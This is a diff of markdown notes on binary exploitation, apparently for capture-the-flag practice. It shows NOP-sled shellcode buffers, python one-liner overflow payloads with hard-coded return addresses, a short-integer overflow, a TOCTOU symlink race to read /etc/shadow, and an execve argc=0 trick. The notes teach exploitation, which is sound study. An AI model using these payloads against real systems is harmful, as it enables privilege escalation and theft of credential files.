@@ -68,16 +68,20 @@ Here you can store the address of EGG to the 11th index and execute the shellcod
 
 2) Address of Shellcode is prepended with NOP and appended with fillers and then with address of the NOPs so that it goes back to the shellcode
 
-`msg = "\x90"*100 + shellcode + "A"*65416 + "\xb8\xd6\xfd\xff"`
+```Python
+msg = "\x90"*100 + shellcode + "A"*65416 + "\xb8\xd6\xfd\xff"
+```
 
 FACT : Environment variables are present in the same stack area as the binary if one can create generate a shell with an EGG and in that shell run the binary
 * Shellcodes are readily available [here](http://shell-storm.org/) but they depends on the system.
 
 #### TOCTOU (Time to Check Time to Use) Attack
-`//piece of code where access permission of file is checked
+```C
+//piece of code where access permission of file is checked
 //Some amount of time in between access granted and file read 
-//piece of code where file is read `
-If, in this time between file access granted and actually read, a symlink is created for the file sensitive information like /etc/passwd or /etc/shadow then it can be read. Again it can be used to invoke shell if code for file execution is present instead of reading 
+//piece of code where file is read 
+```
+If, in this time between file access granted and actually read, a symlink is created for the file sensitive information like `/etc/passwd` or `/etc/shadow` then it can be read. Again it can be used to invoke shell if code for file execution is present instead of reading 
 Implementation : Run the binary in background using & and in foreground create a symlink of same name to a malicious file 
 FACT : The system does not check whether it is file or symlink
 
@@ -95,7 +99,9 @@ FACT : The system does not check whether it is file or symlink
   }
 ```
 This can be overflowed using 
-`` <name of binary> `python -c 'print "A"*512'` `python -c 'print "B"*8 +"\xdf\xd6\xff\xff"'` ``
+```Python
+<name of binary> `python -c 'print "A"*512'` `python -c 'print "B"*8 +"\xdf\xd6\xff\xff"'
+```
 
 #### Overflowing a short variable
  ```C
@@ -109,9 +115,10 @@ This can be overflowed using
 }
  ```
  Here the len variable is short(2B) can be overflowed. But we can improve it by repeating a series of NOPs followed by address of EGG variable 4096 times
- `` <name of binary> `python -c 'print "\x90\x90"+"\x90\x90\x90\x90\xdf\xd6\xff\xff"*4096'` <other arguments> ``
- `` <name of binary> `python -c 'print "A"*512'` `python -c 'print "B"*8 +"\xdf\xd6\xff\xff"'` ``
-
+ ```Python
+ <name of binary> `python -c 'print "\x90\x90"+"\x90\x90\x90\x90\xdf\xd6\xff\xff"*4096'` <other arguments> 
+ ```
+ 
 ### Techniques :
 * The very first step: Figure out the nature of the challenge. Is the stack executable? Is there [ASLR](https://searchsecurity.techtarget.com/definition/address-space-layout-randomization-ASLR) (or [PIE](https://eklitzke.org/position-independent-executables)) involved?
 * Look for system calls, array with hard-coded array sizes or offsets, excessive number of type castings
@@ -123,8 +130,8 @@ This can be overflowed using
 * How to keep argc = 0 or How to keep argc = 0 but pass argv ?
 ```C
 char *argv[]={ NULL};
-        char *envp[]={"b","c","d",payload,value,NULL};
-        execve("<path to binary>", argv,envp );
+char *envp[]={"b","c","d",payload,value,NULL};
+execve("<path to binary>", argv,envp );
 ```
         
 * Tips to find which part of string is being taken as EIP. Pass a string like "AAAABBBBCCCCDDDD...." and use gdb-peda to see what is the EIP value when there is segmentation fault. Then replace the EGG variable addresss in place of that part of string. 
